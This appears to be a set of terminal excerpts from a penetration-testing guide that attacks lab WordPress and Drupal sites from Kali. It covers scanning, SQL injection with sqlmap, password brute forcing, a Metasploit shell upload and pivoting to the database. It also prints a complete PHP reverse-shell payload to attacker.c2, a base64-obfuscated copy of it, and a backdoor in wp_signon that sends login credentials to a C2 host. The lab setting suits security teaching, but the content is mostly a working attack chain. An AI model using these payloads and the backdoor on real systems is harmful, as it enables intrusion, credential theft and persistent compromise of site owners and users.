["```\n**root@kali:~# wpscan --url http://cookingwithfire.local/ --proxy 127.0.0.1:8080**\n\n```", "```\nroot@kali:~# **wpscan --url http://cookingwithfire.local/**\n**_______________________________________________________________**\n **__          _______   _____** \n **\\ \\        / /  __ \\ / ____|** \n **\\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®**\n **\\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _' | '_ \\** \n **\\  /\\  /  | |     ____) | (__| (_| | | | |**\n **\\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|**\n\n **WordPress Security Scanner by the WPScan Team**\n **Version 2.9.3**\n **Sponsored by Sucuri - https://sucuri.net**\n **@_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_**\n**_______________________________________________________________**\n\n[+] URL: http://cookingwithfire.local/\n\n**[!] The WordPress 'http://cookingwithfire.local/readme.html' file exists exposing a version number**\n**[!] Full Path Disclosure (FPD) in 'http://cookingwithfire.local/wp-includes/rss-functions.php':**\n[+] Interesting header: LINK: <http://cookingwithfire.local/index.php?rest_route=/>; rel=\"https://api.w.org/\"\n[+] Interesting header: SERVER: Apache/2.4.25 (Debian)\n[+] Interesting header: X-POWERED-BY: PHP/7.2.3\n[+] XML-RPC Interface available under: http://cookingwithfire.local/xmlrpc.php\n\n[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml\n**[!] 1 vulnerability identified from the version number**\n\n**[!] Title:** \n**WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)**\n    Reference: https://wpvulndb.com/vulnerabilities/9021\n    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html\n    Reference: https://github.com/quitten/doser.py\n    Reference: https://thehackernews.com/2018/02/WordPress-dos-exploit.html\n    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389\n\n[+] WordPress theme in use: kale - v2.2\n\n[+] Name: kale - v2.2\n |  Latest version: 2.2 (up to date)\n |  Last updated: 2018-03-11T00:00:00.000Z\n |  Location: http://cookingwithfire.local/wp-content/themes/kale/\n |  Readme: http://cookingwithfire.local/wp-content/themes/kale/readme.txt\n |  Changelog: http://cookingwithfire.local/wp-content/themes/kale/changelog.txt\n |  Style URL: http://cookingwithfire.local/wp-content/themes/kale/style.css\n |  Theme Name: Kale\n |  Theme URI: https://www.lyrathemes.com/kale/\n |  Description: Kale is a charming and elegant, aesthetically minimal and uncluttered food blog theme that can al...\n |  Author: LyraThemes\n |  Author URI: https://www.lyrathemes.com/\n\n[+] Enumerating plugins from passive detection ...\n[+] No plugins found\n\n[+] Requests Done: 348\n[+] Memory used: 41.449 MB\n[+] Elapsed time: 00:00:03\nroot@kali:~#\n```", "```\n**root@kali:~# wpscan --url [url] -e ap -e at -e u**\n\n```", "```\nroot@kali:~# wpscan --url http://cookingwithfire.local/ **--enumerate p**\n[...]\n[+] URL: http://cookingwithfire.local/\n[...]\n[+] Enumerating installed plugins (only ones marked as popular) ...\n[...]\n\n[+] Name: google-document-embedder - v2.5\n |  Last updated: 2018-01-10T16:02:00.000Z\n |  Location: http://cookingwithfire.local/wp-content/plugins/google-document-embedder/\n |  Readme: http://cookingwithfire.local/wp-content/plugins/google-document-embedder/readme.txt\n**[!] The version is out of date, the latest version is 2.6.4**\n\n**[!] Title: Google Document Embedder 2.4.6 - pdf.php file Parameter Arbitrary File Disclosure**\n    Reference: https://wpvulndb.com/vulnerabilities/6073\n    Reference: http://www.securityfocus.com/bid/57133/\n    Reference: http://packetstormsecurity.com/files/119329/\n    Reference: http://ceriksen.com/2013/01/03/WordPress-google-document-embedder-arbitrary-file-disclosure/\n    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4915\n    Reference: https://secunia.com/advisories/50832/\n    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_google_document_embedder_exec\n    Reference: https://www.exploit-db.com/exploits/23970/\n[i] Fixed in: 2.5.4\n\n**[!] Title: Google Document Embedder <= 2.5.14 - SQL Injection**\n    Reference: https://wpvulndb.com/vulnerabilities/7690\n    Reference: http://security.szurek.pl/google-doc-embedder-2514-sql-injection.html\n    Reference: https://exchange.xforce.ibmcloud.com/vulnerabilities/98944\n    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9173\n    Reference: https://www.exploit-db.com/exploits/35371/\n[i] Fixed in: 2.5.15\n\n**[!] Title:  Google Document Embedder <= 2.5.16 - SQL Injection**\n    Reference: https://wpvulndb.com/vulnerabilities/7704\n    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9173\n    Reference: https://www.exploit-db.com/exploits/35447/\n[i] Fixed in: 2.5.17\n\n**[!] Title: Google Doc Embedder <= 2.5.18 - Cross-Site Scripting (XSS)**\n    Reference: https://wpvulndb.com/vulnerabilities/7789\n    Reference: http://packetstormsecurity.com/files/130309/\n    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1879\n[i] Fixed in: 2.5.19\n\n[+] Requests Done: 1766\n[+] Memory used: 123.945 MB\n[+] Elapsed time: 00:00:10\nroot@kali:~#\n```", "```\n**root@kali:~# sqlmap -u \"http://cookingwithfire.local/wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=0\" -p gpid**\n\n**[*] starting at 10:07:41**\n\n**[10:07:41] [INFO] testing connection to the target URL**\n**[...]**\n\n```", "```\n[10:07:49] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'\n[10:07:49] [INFO] **GET parameter 'gpid' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable**\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y\n```", "```\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y\n[10:07:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n**GET parameter 'gpid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n**\nsqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:\n---\nParameter: gpid (GET)\n    Type: **error-based**\n    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)\n    Payload: **embedded=1&gpid=(SELECT 1349 FROM(SELECT COUNT(*),CONCAT(0x716b6a7171,(SELECT (ELT(1349=1349,1))),0x716b6a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)**\n**---**\n**[10:08:07] [INFO] the back-end DBMS is MySQL**\n**web server operating system: Linux Debian**\n**web application technology: Apache 2.4.25, PHP 7.2.3**\n**back-end DBMS: MySQL >= 5.0**\n**[10:08:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/cookingwithfire.local'**\n\n**[*] shutting down at 10:08:07**\n\n**root@kali:~#**\n\n```", "```\n**root@kali:~/tools# git clone https://github.com/droope/droopescan**\n**Cloning into 'droopescan'...**\n**[...]**\n**root@kali:~/tools# cd droopescan/**\n**root@kali:~/tools/droopescan# ls**\n**CHANGELOG  droopescan  dscan  LICENSE  MANIFEST.in  README.md  README.txt  requirements_test.txt  requirements.txt  setup.cfg  setup.py**\n\n```", "```\n**root@kali:~/tools/droopescan# pip install -r requirements.txt**\n**Obtaining file:///root/tools/droopescan (from -r requirements.txt (line 3))**\n**[...]**\n**root@kali:~/tools/droopescan#**\n\n```", "```\n**root@kali:~/tools/droopescan# python setup.py install**\n**Obtaining file:///root/tools/droopescan (from -r requirements.txt (line 3))**\n**[...]**\n**root@kali:~/tools/droopescan#**\n\n```", "```\nroot@kali:~# droopescan scan drupal -u http://ramblings.local -t 8\n[+] No themes found.\n\n[+] Possible interesting urls found:\n **Default admin** - http://ramblings.local/user/login\n\n[+] Possible version(s):\n **8.5.0-rc1**\n\n[+] No plugins found.\n\n[+] Scan finished (0:03:34.527555 elapsed)\nroot@kali:~#\n```", "```\nroot@kali:~/tools/arachni/bin# **./arachni_web_create_user root@kali.local A!WebOf-Lies* root**\nUser 'root' with e-mail address 'root@kali.local' created with password 'A!WebOf-Lies*'.\nroot@kali:~/tools/arachni/bin#\n```", "```\n**root@kali:~/tools/arachni/bin# ./arachni_web**\n**Puma 2.14.0 starting...**\n*** Min threads: 0, max threads: 16**\n*** Environment: development**\n*** Listening on tcp://localhost:9292**\n**::1 - - \"GET /unauthenticated HTTP/1.1\" 302 - 0.0809**\n**[...]**\n**::1 - - \"GET /navigation HTTP/1.1\" 304 - 0.0473**\n**::1 - - \"GET /profiles?action=index&controller=profiles&tab=global HTTP/1.1\" 200 - 0.0827**\n**::1 - - \"GET /navigation HTTP/1.1\" 304 - 0.0463**\n\n```", "```\nroot@kali:~# wpscan --url http://cookingwithfire.local/ **--enumerate u**\n[+] Enumerating plugins from passive detection ...\n[+] No plugins found\n\n[+] Enumerating usernames ...\n[+] Identified the following 2 user/s:\n    +----+--------+--------+\n    | Id | Login  | Name   |\n    +----+--------+--------+\n    | 1  | msmith | msmith |\n    | 2  | mary   | Mary K |\n    +----+--------+--------+\n\n[+] Requests Done: 377\n[+] Memory used: 3.836 MB\n[+] Elapsed time: 00:00:10\n```", "```\nroot@kali:~# wpscan --url http://cookingwithfire.local/ --usernames mary  --passwords ~/tools/SecLists/Passwords/Leaked-Databases/rockyou-10.txt\n\n[+] Starting the password brute forcer\n[+] [SUCCESS] Login : mary Password : **spongebob**\n\n  Brute Forcing 'mary' Time: 00:00:01 <===============    > (87 / 93) 93.54%  ETA: 00:00:00\n  +----+-------+------+-----------+\n  | Id | Login | Name | Password  |\n  +----+-------+------+-----------+\n  |    | mary  |      | **spongebob** |\n  +----+-------+------+-----------+\n\n[+] Requests Done: 441\n[+] Memory used: 41.922 MB\n[+] Elapsed time: 00:00:12\n```", "```\n**root@kali:~# msfconsole -q**\n\n```", "```\n**msf > use exploit/unix/webapp/wp_admin_shell_upload**\n**msf exploit(unix/webapp/wp_admin_shell_upload) > options**\n\nModule options (exploit/unix/webapp/wp_admin_shell_upload):\n\n Name       Current Setting       Required  Description\n ----       ---------------       --------  -----------\n PASSWORD  **spongebob**\n       yes       The WordPress password to authenticate with\n Proxies                          no        A proxy chain of formattype:host:port[,type:host:port][...]\n RHOST      cookingwithfire.local  yes        The target address\n RPORT      80                    yes       The target port (TCP)\n SSL        false                 no        Negotiate SSL/TLS for outgoing connections\n TARGETURI  /                     yes       The base path to the WordPress application\nUSERNAME **mary** yes       The WordPress username to authenticate with\n VHOST                            no        HTTP server virtual host\n```", "```\n**msf exploit(unix/webapp/wp_admin_shell_upload) > run**\n\n[*] Started reverse TCP handler on 10.0.5.42:4444\n[*] Authenticating with WordPress using mary:spongebob...\n[+] Authenticated with WordPress\n[*] Preparing payload...\n[*] Uploading payload...\n**[*] Executing the payload at /wp-content/plugins/ydkwFvZLIl/rtYDipUTLv.php...**\n[*] Sending stage (37543 bytes) to 172.17.0.3\n**[*] Meterpreter session 6 opened** (10.0.5.42:4444 -> 172.17.0.3:36670)\n[+] Deleted rtYDipUTLv.php\n[+] Deleted ydkwFvZLIl.php\n[+] Deleted ../ydkwFvZLIl\nmeterpreter >\n```", "```\nmeterpreter > **sysinfo**\nComputer    : 71f92e12765d\nOS          : Linux 71f92e12765d 4.14.0 #1 SMP Debian 4.14.17 x86_64\nMeterpreter : php/linux\n\nmeterpreter > **getuid**\nServer username: www-data (33)\nmeterpreter >\n```", "```\n**msf > use payload/php/meterpreter/reverse_tcp**\n**msf payload(php/meterpreter/reverse_tcp) > options**\n\n**Module options (payload/php/meterpreter/reverse_tcp):**\n\n **Name   Current Setting  Required  Description**\n **----   ---------------  --------  -----------**\n **LHOST  attacker.c2      yes       The listen address**\n **LPORT  4444             yes       The listen port**\n\n**msf payload(php/meterpreter/reverse_tcp) >**\n\n```", "```\n**msf payload(php/meterpreter/reverse_tcp) > generate -h**\n**Usage: generate [options]**\n\n**Generates a payload.**\n\n**OPTIONS:**\n\n **-E        Force encoding.**\n **-b <opt>  The list of characters to avoid: '\\x00\\xff'**\n **-e <opt>  The name of the encoder module to use.**\n **-f <opt>  The output file name (otherwise stdout)**\n **-h        Help banner.**\n **-i <opt>  the number of encoding iterations.**\n **-k        Keep the template executable functional**\n **-o <opt>  A comma separated list of options in VAR=VAL format.**\n **-p <opt>  The Platform for output.**\n **-s <opt>  NOP sled length.**\n **-t <opt>  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war**\n **-x <opt>  The executable template to use**\n\n```", "```\nmsf payload(php/meterpreter/reverse_tcp) > generate -t raw\n**/*<?php /**/ error_reporting(0); $ip = 'attacker.c2'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();**\n\nmsf payload(php/meterpreter/reverse_tcp) >\n```", "```\nmsf payload(php/meterpreter/reverse_tcp) > generate -t raw -E\n**eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ2F0dGFja2VyLmMyJzsgJHBvcnQgPSA0NDQ0OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNrKCJO.bGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs));**\n\n**msf payload(php/meterpreter/reverse_tcp) >**\n\n```", "```\n**msf > use exploit/multi/handler**\n\n```", "```\n**msf exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp**\n**msf exploit(multi/handler) >**\n\n```", "```\n**msf exploit(multi/handler) > options**\n\n**Payload options (php/meterpreter/reverse_tcp):**\n\n **Name   Current Setting  Required  Description**\n **----   ---------------  --------  -----------**\n **LHOST  attacker.c2      yes       The listen address**\n **LPORT  4444             yes       The listen port**\n\n**Exploit target:**\n\n **Id  Name**\n **--  ----**\n **0   Wildcard Target**\n\n```", "```\n**msf exploit(multi/handler) > set ExitOnSession false**\n**ExitOnSession => false**\n\n```", "```\n**msf exploit(multi/handler) > run -j**\n**[*] Exploit running as background job 2.**\n\n**[*] Started reverse TCP handler on attacker.c2:4444**\n**msf exploit(multi/handler) >**\n\n```", "```\n**root@kali:~# curl http://cookingwithfire.local/wp-content/themes/twentyseventeen/404.php**\n**[...]**\n\n```", "```\n[*] Sending stage (37543 bytes) to 172.17.0.3\n**[*] Meterpreter session 8 opened** (10.0.5.42:4444 -> 172.17.0.3:36194)\n\nmsf exploit(multi/handler) > **sessions -i 8**\n[*] Starting interaction with 8...\n\nmeterpreter >\n```", "```\nmeterpreter > **sysinfo**\nComputer    : 0f2dfe914f09\nOS          : Linux 0f2dfe914f09 4.14.0 #1 SMP Debian 4.14.17 x86_64\nMeterpreter : php/linux\n\nmeterpreter > **getuid**\nServer username: www-data (33)\nmeterpreter >\n```", "```\nmeterpreter > cat /var/www/html/wp-config.php\n<?php\n/**\n * The base configuration for WordPress\n *\n[...]\n * This file contains the following configurations:\n *****\n *** * MySQL settings**\n *** * Secret keys**\n *** * Database table prefix**\n *** * ABSPATH**\n *****\n *** @link https://codex.WordPress.org/Editing_wp-config.php**\n *****\n *** @package WordPress**\n ***/**\n\n**// ** MySQL settings - You can get this info from your web host ** //**\n**/** The name of the database for WordPress */**\n**define('DB_NAME', 'WordPress');**\n\n**/** MySQL database username */**\n**define('DB_USER', '**\n**WordPress');**\n\n**/** MySQL database password */**\n**define('DB_PASSWORD', 'ZXQgdHUgYnJ1dGU/');**\n\n**/** MySQL hostname */**\n**define('DB_HOST', '127.0.0.1:3306');**\n\n[...]\n```", "```\n**msf payload(php/meterpreter/reverse_tcp) > sessions**\n\n**Active sessions**\n**===============**\n\n **Id  Name  Type              Information       Connection**\n **--  ----  ----              -----------       ----------**\n **8         meterpreter php/                    www-data @ linux                               0f2dfe914f09  10.0.5.42:4444 ->** \n**172.17.0.3:36194 (172.17.0.3)**\n\n```", "```\n**msf payload(php/meterpreter/reverse_tcp) > route add 127.0.0.1/32 8**\n**[*] Route added**\n**msf payload(php/meterpreter/reverse_tcp) > route print**\n\n**IPv4 Active Routing Table**\n**=========================**\n\n **Subnet             Netmask            Gateway**\n **------             -------            -------**\n **127.0.0.1           255.255.255.255    Session 8**\n\n```", "```\n**msf payload(php/meterpreter/reverse_tcp) > use auxiliary/server/socks4a**\n**msf auxiliary(server/socks4a) > options**\n\n**Module options (auxiliary/server/socks4a):**\n\n **Name     Current Setting  Required  Description**\n **----     ---------------  --------  -----------**\n **SRVHOST  0.0.0.0          yes       The address to listen on**\n **SRVPORT  1080             yes       The port to listen on.**\n\n**msf auxiliary(server/socks4a) > run**\n**[*] Auxiliary module running as background job 1.**\n**[*] Starting the socks4a proxy server**\n\n```", "```\n**msf auxiliary(server/socks4a) > jobs**\n\n**Jobs**\n**====**\n\n **Id  Name                 Payload                Payload opts**\n **--  ----                 -------                ------------**\n **0   Exploit: multi/      php/meterpreter/       tcp://attackhandler              reverse_tcp            er.c2:4444**\n **1    Auxiliary: server/socks4a** \n\n```", "```\nroot@kali:~# tail /etc/proxychains.conf\n[...]\n#\n#       proxy types: http, socks4, socks5\n#        ( auth types supported: \"basic\"-http  \"user/pass\"-socks )\n#\n[ProxyList]\n**socks4     127.0.0.1 1080**\n\n```", "```\nroot@kali:~# proxychains mysql -h127.0.0.1 -uWordPress -p\nProxyChains-3.1 (http://proxychains.sf.net)\nEnter password: **ZXQgdHUgYnJ1dGU/**\n|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:3306-<><>-OK\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 28\nServer version: 5.6.37 MySQL Community Server (GPL)\n\n**Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.**\n\n```", "```\n**MySQL [(none)]> show databases;**\n**+--------------------+**\n**| Database           |**\n**+--------------------+**\n**| information_schema |**\n**| WordPress          |**\n**| test               |**\n**+--------------------+**\n**3 rows in set (0.00 sec)**\n\n**MySQL [none]> show tables from WordPress;**\n**+-----------------------------+**\n**| Tables_in_WordPress |**\n**+-----------------------------+**\n**| wp_commentmeta              |**\n**| wp_comments                 |**\n**| wp_links                    |**\n**| wp_options                  |**\n**| wp_postmeta                 |**\n**| wp_posts                    |**\n**| wp_term_relationships       |**\n**| wp_term_taxonomy            |**\n**| wp_termmeta                 |**\n**| wp_terms                    |**\n**| wp_usermeta                 |**\n**| wp_users                    |**\n**+-----------------------------+**\n**12 rows in set (0.00 sec)**\n\n```", "```\n**MySQL [none]> select id, user_login, user_pass, user_email from WordPress.wp_users where id=1;**\n**+----+------------+------------------------+------------------+**\n**| id | user_login | user_pass              | user_email       |**\n**+----+------------+------------------------+------------------+**\n**|  1 | msmith     | $P$BX5YqWaua3jKQ1OBFgui| msmith@cookingwit|**\n**|    |            | UhBxsiGutK/            | hfire.local      |**\n**+----+------------+------------------------+------------------+**\n**1 row in set (0.01 sec)**\n\n```", "```\nroot@kali:~# cat hashes\n**msmith:$P$BX5YqWaua3jKQ1OBFquiUhBxsiGutK/**\nroot@kali:~# **john hashes --**\n**wordlist=~/tools/SecLists/Passwords/darkc0de.txt**\nUsing default input encoding: UTF-8\nLoaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:01 0.72% (ETA: 10:24:24) 0g/s 4897p/s 4897c/s 4897C/s 11770..11/9/69\n0g 0:00:00:02 1.10% (ETA: 10:25:08) 0g/s 4896p/s 4896c/s 4896C/s 123din7361247iv3..123ducib19\n0g 0:00:00:04 1.79% (ETA: 10:25:49) 0g/s 4906p/s 4906c/s 4906C/s 16 HERRERA..16th\n0g 0:00:00:20 6.59% (ETA: 10:27:09) 0g/s 4619p/s 4619c/s 4619C/s 4n0d3..4n0m47h3c4\n```", "```\nfile_put_contents(**[file to write to]**, **[data to write]**, **FILE_APPEND**);\n```", "```\n@file_get_contents(**[c2 URL]**);\n```", "```\nfile_put_contents(**'wp-content/uploads/.index.php.swp'**, base64_encode(json_encode(**$_POST**)) . PHP_EOL, FILE_APPEND);\n@file_get_contents(**'http://pingback.c2.spider.ml/ping.php?id='** . base64_encode(json_encode(**$_POST**)));\n```", "```\n<?php\n/**\n * Core User API\n *\n * @package WordPress\n * @subpackage Users\n */\n[...]\n\nfunction wp_signon( $credentials = array(), $secure_cookie = '' ) {\n[...]\n  if ( is_wp_error($user) ) {\n    if ( $user->get_error_codes() == array('empty_username', 'empty_password') ) {\n      $user = new WP_Error('', '');\n    }\n\n    return $user;\n  }\n\n  **file_put_contents('wp-content/uploads/.index.php.swp', base64_encode(json_encode($_POST)) . PHP_EOL, FILE_APPEND);**\n\n  **@file_get_contents('http://pingback.c2.spider.ml/ping.php?id=' . base64_encode(json_encode($_POST)));**\n  wp_set_auth_cookie($user->ID, $credentials['remember'], $secure_cookie);\n  /**\n```", "```\n   * Fires after the user has **successfully** logged in.\n   *\n   * @since 1.5.0\n   *\n   * @param string  $user_login Username.\n   * @param WP_User $user       WP_User object of the logged-in user.\n   */\n  **do_action( 'wp_login', $user->user_login, $user );**\n  **return $user;**\n}\n```", "```\nroot@kali:~# curl http://cookingwithfire.local/wp-content/uploads/.index.php.swp\n**eyJsb2ciOiJtc21pdGgiLCJwd2QiOiJpWVFOKWUjYTRzKnJMZTdaaFdoZlMmXnYiLCJ3cC1zdWJtaXQiOiJMb2cgSW4iLCJyZWRpcmVjdF90byI6Imh0dHA6XC9cL2Nvb2tpbmd3aXRoZmlyZS5sb2NhbFwvd3AtYWRtaW5cLyIsInRlc3Rjb29raWUiOiIxIn0=**\nroot@kali:~#\n```", "```\nroot@spider-c2-1:~/c2# php -S 0.0.0.0:80\nPHP 7.0.27-0+deb9u1 Development Server started\nListening on http://0.0.0.0:80\nDocument root is /root/c2\nPress Ctrl-C to quit.\n[] 192.30.89.138:53039 [200]: **/ping.php?id=eyJsb2ciOiJtc21pdGgiLCJwd2QiOiJpWVFOKWUjYTRzKnJMZTdaaFdoZlMmXnYiLCJ3cC1zdWJtaXQiOiJMb2cgSW4iLCJyZWRpcmVjdF90byI6Imh0dHA6XC9cL2Nvb2tpbmd3aXRoZmlyZS5sb2NhbFwvd3AtYWRtaW5cLyIsInRlc3Rjb29raWUiOiIxIn0=**\n\n```", "```\n**root@kali:~# curl -s http://cookingwithfire.local/wp-content/uploads/.index.php.swp | base64 -d**\n**{\"log\":\"msmith\",\"pwd\":\"iYQN)e#a4s*rLe7ZhWhfS&^v\",\"wp-submit\":\"Log In\",\"redirect_to\":\"http:\\/\\/cookingwithfire.local\\/wp-admin\\/\",\"testcookie\":\"1\"}**\n\n```"]